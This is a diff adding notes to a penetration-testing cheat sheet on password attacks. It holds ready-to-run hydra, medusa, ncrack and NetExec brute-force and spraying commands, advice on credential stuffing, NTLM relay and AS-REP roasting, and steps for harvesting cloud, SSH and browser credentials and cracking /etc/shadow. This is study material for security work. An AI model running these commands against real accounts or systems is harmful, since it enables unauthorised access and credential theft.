@@ -1,3 +1,7 @@
+# Password Attacks
+
+Online brute-force, spraying, credential stuffing, and local credential discovery. **Always** be mindful of account lockouts, logging, and rate limits.
+
 ## Connecting to Target
 
 | **Command**| **Description**|
@@ -99,3 +103,38 @@
 | `bitlocker2john -i Backup.vhd > backup.hashes`               | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. |
 | `file GZIP.gzip`                                             | Uses the Linux-based file tool to gather file format information. |
 | `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Script that runs a for-loop to extract files from an archive. |
+
+## 2026 Modern Notes & Tools
+
+- **NetExec** (successor to CrackMapExec): `nxc smb target -u users.txt -p pass.txt --continue-on-success`
+- Use `hydra` / `medusa` / `ncrack` for service brute force, but prefer NetExec where possible.
+- For web: Burp Intruder + custom Python (requests + threading or `ffuf` + `-X POST`).
+- Spray with extreme caution: 1 password : many users, long delays (`-p 60` or use proxy rotation).
+- Credential stuffing from breaches: use HaveIBeenPwned style lists + rules.
+- Windows auth: Kerberos (AS-REP roasting with Rubeus), NTLM relay with ntlmrelayx (impacket).
+- Linux: look for `~/.aws`, `~/.docker/config.json`, browser creds (LaZagne, firefox_decrypt still good), SSH keys.
+- John the Ripper still useful for some formats; hashcat for GPU speed.
+
+Example safe spray:
+```bash
+hydra -L users.txt -p 'Company2026!' -t 1 -w 30 ssh://target
+```
+
+## Additional Real Examples
+
+```bash
+# Medusa on multiple services
+medusa -h target -U users.txt -P passwords.txt -M ssh -t 4
+medusa -h target -u admin -P rockyou.txt -M http -m "DIR:/admin"
+
+# ncrack
+ncrack -U users.txt -P top100.txt ssh://target:22
+
+# Online service specific
+hydra -L users.txt -P pass.txt -s 143 imap://target
+hydra -l admin -P pass.txt ftp://target
+
+# Local Linux password discovery + cracking
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john hashes.txt --wordlist=rockyou.txt
+```
